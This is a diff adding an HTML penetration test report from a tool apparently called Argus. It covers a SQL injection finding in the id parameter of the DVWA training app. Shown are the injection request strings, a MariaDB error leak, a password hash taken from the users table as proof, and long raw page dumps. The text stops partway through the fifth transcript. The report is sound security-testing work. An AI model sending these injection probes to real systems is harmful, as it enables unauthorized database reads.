@@ -1,0 +1,1476 @@
+<!doctype html><html><head><meta charset="utf-8">
+<title>Argus report - 20261116-015058-192.168.223.221</title><style>
+body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:2rem auto;
+max-width:960px;color:#222;line-height:1.5}
+h1{border-bottom:3px solid #333;padding-bottom:.4rem}
+h2{margin-top:2rem;border-bottom:1px solid #ccc;padding-bottom:.2rem}
+.meta{color:#555;font-size:.9rem}
+table{border-collapse:collapse;margin:.6rem 0}
+td,th{border:1px solid #bbb;padding:.3rem .8rem;text-align:left}
+.badge{display:inline-block;color:#fff;border-radius:4px;
+padding:.1rem .5rem;font-size:.8rem;font-weight:600}
+.finding{border:1px solid #ddd;border-left:6px solid #999;border-radius:6px;
+padding:1rem 1.2rem;margin:1rem 0;background:#fafafa}
+pre{background:#1e1e1e;color:#ddd;padding:.7rem;border-radius:6px;
+overflow-x:auto;font-size:.82rem;white-space:pre-wrap}
+details{margin:.4rem 0}
+summary{cursor:pointer;color:#0366d6}
+code{background:#eee;padding:.05rem .3rem;border-radius:3px}
+</style></head>
+<body>
+<h1>Penetration Test Report</h1>
+
+<p class="meta"><b>Session:</b> 20261116-015058-192.168.223.221<br>
+<b>Date:</b> 2026-11-16 01:50:58<br>
+<b>Agent model:</b> probe-driver &nbsp; <b>Requests:</b> 18 &nbsp; <b>Argus:</b> 1.0.0</p>
+<h2>Executive summary</h2>
+<p>Probe-driven run: the operator named the endpoints; the probes, the evidence gate and this report are the system&#x27;s own.</p>
+<table><tr><th>Severity</th><th>Count</th></tr><tr><td><span class='badge' style='background:#7c1d1d'>CRITICAL</span></td><td>2</td></tr></table>
+<h2>Engagement constraints</h2>
+<p><b>Scope hosts:</b> (target only)<br><b>Excluded paths:</b> none<br><b>Budgets:</b> ? turns, ? requests, ? rps<br><b>Proxy:</b> no · <b>TLS verify:</b> no<br><b>Tool surface:</b> all</p>
+<h2>Proof grades</h2>
+<table><tr><th>Grade</th><th>Count</th><th>Meaning</th></tr>
+<tr><td><span class='badge' style='background:#1e7b34'>PROVEN</span></td><td>2</td><td>the class-specific artifact and its control are on record</td></tr></table>
+<h2>Findings</h2>
+<div class='finding' style='border-left-color:#7c1d1d'><h3>F01 - SQL injection in /vulnerabilities/sqli id parameter</h3><p><span class='badge' style='background:#7c1d1d'>CRITICAL</span> <span class='badge' style='background:#1e7b34'>PROOF: PROVEN</span> &nbsp; <b>Category:</b> sqli &nbsp; <b>Endpoint:</b> <code>http://192.168.223.221:8081</code> &nbsp; <b>CWE:</b> <code>CWE-89</code> &nbsp; <b>OWASP:</b> A03 Injection</p><p><b>Description</b><br>SQL injection via the `id` parameter: the DBMS names itself in the error channel and a bounded UNION read returns rows from `users`.</p><p><b>Proof (verbatim excerpt)</b></p><pre>5f4dcc3b5aa765d61d8327deb882cf99</pre><details><summary>Transcript r1: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vulnerabil</pre></details><details><summary>Transcript r2: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27&amp;Submit=Submit -> 200</summary><pre>&lt;pre&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1&lt;/pre&gt;</pre></details><details><summary>Transcript r3: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%271&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; AND &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../.</pre></details><details><summary>Transcript r4: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vulnerabilities/view_help.php?id=sqli&amp;security=low&#x27; )&quot;&gt; &lt;input type=&quot;</pre></details><details><summary>Transcript r5: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D1&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
